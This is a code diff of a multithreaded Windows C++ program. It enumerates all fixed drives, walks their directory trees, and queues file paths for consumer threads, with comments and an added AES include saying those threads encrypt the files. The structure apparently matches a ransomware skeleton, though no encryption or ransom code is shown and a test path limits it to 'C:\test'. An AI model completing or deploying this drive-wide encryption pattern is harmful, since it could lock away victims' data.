@@ -9,6 +9,7 @@
 #include <windows.h>
 
 #include "concurrentqueue.h"
+#include "AESCrypto.h"
 
 using namespace std;
 using namespace boost::filesystem;
@@ -39,7 +40,7 @@ int main(int argc, char* argv[]) {
 	moodycamel::ConcurrentQueue<wstring> queue;
 	moodycamel::ProducerToken ptok(queue);
 	const int producer_count = 1;
-	const int consumer_count = 3;
+	const int consumer_count = 4;
 	thread producers[producer_count];
 	thread consumers[consumer_count];
 	atomic<int> doneProducer(0);
@@ -50,6 +51,7 @@ int main(int argc, char* argv[]) {
 	producers[0] = thread(bind(&produce, ref(producer_bundle)));
 
 	consumer_bundle consumer_bundle = { queue, ptok, doneProducer, doneComsumer, producer_count, consumer_count };
+	// Start consumer threads
 	for (int i = 0; i < consumer_count; ++i) {
 		consumers[i] = thread(bind(&consume, ref(consumer_bundle), i));
 	}
@@ -60,7 +62,7 @@ int main(int argc, char* argv[]) {
 		consumers[i].join();
 	}
 
-	
+	system("pause");
 	return 0;
 }
 
@@ -111,16 +113,16 @@ vector<wstring>* get_available_drives() {
 
 	if (!GetLogicalDriveStringsW(ARRAYSIZE(myDrives) - 1, myDrives))
 	{
-		wprintf(L"GetLogicalDrives() failed with error code: %lu\n", GetLastError());
+		wprintf(L"GetLogicalDrives() failed with error code: %lu \n", GetLastError());
 	}
 	else
 	{
-		wprintf(L"This machine has the following logical drives:\n");
+		wprintf(L"This machine has the following logical drives: \n");
 
 		for (LPWSTR drive = myDrives; *drive != 0; drive += 4)
 		{
 			driveType = GetDriveTypeW(drive);
-			wprintf(L"Drive %s is type %d - ", drive, driveType);
+			wprintf(L"Drive %s is type %d \n", drive, driveType);
 
 			if (driveType == DRIVE_FIXED) {
 				wstring drive_string(drive);
@@ -160,8 +162,13 @@ void produce(producer_bundle& bundle) {
 		wcout << L"\t- " << s << endl;
 	}*/
 
+	// Testing
+	drives = new vector<wstring>();
+	drives->push_back(L"C:\\test");
+
 	// Try searching for data on all drives
 	for (wstring drive : *drives) {
+		
 		recursive_directory_iterator dir(drive), end;
 		while (dir != end) {
 			try
@@ -210,6 +217,7 @@ void consume(consumer_bundle& bundle, const int& consumer_id) {
 	const int& producer_count = bundle.producer_count;
 	const int& consumer_count = bundle.consumer_count;
 
+	// Consume paths from producer thread for encryption
 	wstring path_str;
 	bool items_left;
 	do {
